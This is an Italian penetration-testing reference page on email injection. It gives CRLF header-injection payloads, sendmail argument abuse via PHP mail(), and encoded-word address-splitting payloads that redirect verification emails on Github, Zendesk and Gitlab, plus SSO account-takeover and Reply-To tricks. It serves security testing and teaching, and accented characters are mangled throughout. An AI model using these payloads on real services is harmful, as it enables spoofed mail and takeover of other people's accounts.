# Email Injections

{{#include ../banners/hacktricks-training.md}}

## Inietta in e-mail inviate

### Inietta Cc e Bcc dopo l'argomento del mittente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Il messaggio verr√† inviato agli account del destinatario e di recipient1.

### Inietta argomento
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Il messaggio verr√† inviato al destinatario originale e all'account dell'attaccante.

### Inietta l'argomento dell'oggetto
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
L'oggetto falso verr√† aggiunto all'oggetto originale e in alcuni casi lo sostituir√†. Dipende dal comportamento del servizio di posta.

### Cambiare il corpo del messaggio

Inietta un'interruzione di due righe, quindi scrivi il tuo messaggio per cambiare il corpo del messaggio.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Sfruttamento della funzione PHP mail()
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Il 5¬∞ parametro ($additional_parameters)

Questa sezione si baser√† su **come abusare di questo parametro supponendo che un attaccante lo controlli**.

Questo parametro verr√† aggiunto alla riga di comando che PHP utilizzer√† per invocare il binario sendmail. Tuttavia, sar√† sanitizzato con la funzione `escapeshellcmd($additional_parameters)`.

Un attaccante pu√≤ **iniettare parametri estratti per sendmail** in questo caso.

#### Differenze nell'implementazione di /usr/sbin/sendmail

L'interfaccia **sendmail** √® **fornita dal software MTA email** (Sendmail, Postfix, Exim, ecc.) installato sul sistema. Anche se la **funzionalit√† di base** (come i parametri -t -i -f) rimane **la stessa** per motivi di compatibilit√†, **altre funzioni e parametri** variano notevolmente a seconda dell'MTA installato.

Ecco alcuni esempi di diverse pagine man del comando/interfaccia sendmail:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

A seconda dell'**origine del binario sendmail**, sono state scoperte diverse opzioni per abusarne e **leakare file o persino eseguire comandi arbitrari**. Controlla come in [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Iniettare nel nome dell'email

> [!CAUTION]
> Nota che se riesci a creare un account in un servizio con un nome di dominio arbitrario (come Github, Gitlab, CloudFlare Zero trust...) e verificarlo ricevendo l'email di verifica nel tuo indirizzo email, potresti essere in grado di accedere a posizioni sensibili dell'azienda vittima.

### Parti ignorate di un'email

I simboli: **+, -** e **{}** in rare occasioni possono essere usati per il tagging e ignorati dalla maggior parte dei server email.

- E.g. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Commenti tra parentesi ()** all'inizio o alla fine saranno anch'essi ignorati.

- E.g. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass della whitelist

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Citazioni

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

Puoi anche usare IP come nomi di dominio tra parentesi quadre:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Codifica dell'email

Come spiegato in [**questa ricerca**](https://portswigger.net/research/splitting-the-email-atom), i nomi delle email possono anche contenere caratteri codificati:

- **Overflow PHP 256**: La funzione PHP `chr` continuer√† ad aggiungere 256 a un carattere fino a diventare positivo e poi eseguire l'operazione `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // êÅÄ ‚Üí @`

> [!TIP]
> L'obiettivo di questo trucco √® terminare con un'iniezione come `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> che invier√† l'email di verifica a un indirizzo email diverso da quello previsto (pertanto per introdurre un altro indirizzo email all'interno del nome dell'email e rompere la sintassi durante l'invio dell'email).

Diverse codifiche:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#¬†iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 ‚Üí x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Nota l'`@` codificato come =40, il `>` codificato come `=3e` e `null` come `=00`&#x20;
- Invier√† l'email di verifica a `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Stesso trucco di prima ma aggiungendo una citazione regolare all'inizio e la citazione codificata `=22` prima dell'`@` codificato e poi iniziando e chiudendo alcune citazioni prima della prossima email per correggere la sintassi utilizzata internamente da Zendesk
- Invier√† l'email di verifica a `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Nota l'uso dell'underscore come spazio per separare l'indirizzo
- Invier√† l'email di verifica a `collab@psres.net`
- Punycode: Utilizzando Punycode √® stato possibile iniettare un tag `<style` in Joomla e abusarne per rubare il token CSRF tramite esfiltrazione CSS.

#### Tooling

- Esiste uno **script Burp Suite Turbo Intruder** per fuzzare questo tipo di combinazioni per cercare di attaccare i formati email. Lo script ha gi√† combinazioni potenzialmente funzionanti.
- √à anche possibile utilizzare [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) per creare un attacco di splitting email

### Altre vulnerabilit√†

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## SSO di terze parti

### XSS

Alcuni servizi come **github** o **salesforce** ti consentono di creare un **indirizzo email con payload XSS su di esso**. Se puoi **utilizzare questi fornitori per accedere ad altri servizi** e questi servizi **non stanno sanitizzando** correttamente l'email, potresti causare **XSS**.

### Account-Takeover

Se un **servizio SSO** ti consente di **creare un account senza verificare l'indirizzo email fornito** (come **salesforce**) e poi puoi utilizzare quell'account per **accedere a un servizio diverso** che **si fida** di salesforce, potresti accedere a qualsiasi account.\
&#xNAN;_&#x4E;ota che salesforce indica se l'email fornita √® stata o meno verificata, ma cos√¨ l'applicazione dovrebbe tenere conto di queste informazioni._

## Reply-To

Puoi inviare un'email utilizzando _**From: company.com**_ e _**Replay-To: attacker.com**_ e se viene inviata una **risposta automatica** a causa dell'email inviata **da** un **indirizzo interno**, l'**attaccante** potrebbe essere in grado di **ricevere** quella **risposta**.

## Tasso di Hard Bounce

Alcuni servizi, come AWS, implementano una soglia nota come **Hard Bounce Rate**, tipicamente impostata al 10%. Questa √® una metrica critica, specialmente per i servizi di consegna email. Quando questo tasso viene superato, il servizio, come il servizio email di AWS, potrebbe essere sospeso o bloccato.

Un **hard bounce** si riferisce a un **email** che √® stata restituita al mittente perch√© l'indirizzo del destinatario √® invalido o inesistente. Questo potrebbe verificarsi per vari motivi, come l'**email** inviata a un indirizzo non esistente, un dominio che non √® reale, o il rifiuto del server del destinatario di accettare **email**.

Nel contesto di AWS, se invii 1000 email e 100 di esse risultano in hard bounce (a causa di motivi come indirizzi o domini non validi), questo significherebbe un tasso di hard bounce del 10%. Raggiungere o superare questo tasso pu√≤ attivare AWS SES (Simple Email Service) per bloccare o sospendere le tue capacit√† di invio email.

√à cruciale mantenere un basso tasso di hard bounce per garantire un servizio email ininterrotto e mantenere la reputazione del mittente. Monitorare e gestire la qualit√† degli indirizzi email nelle tue liste di distribuzione pu√≤ aiutare significativamente a raggiungere questo obiettivo.

Per informazioni pi√π dettagliate, √® possibile fare riferimento alla documentazione ufficiale di AWS sulla gestione dei bounce e dei reclami [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Riferimenti

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
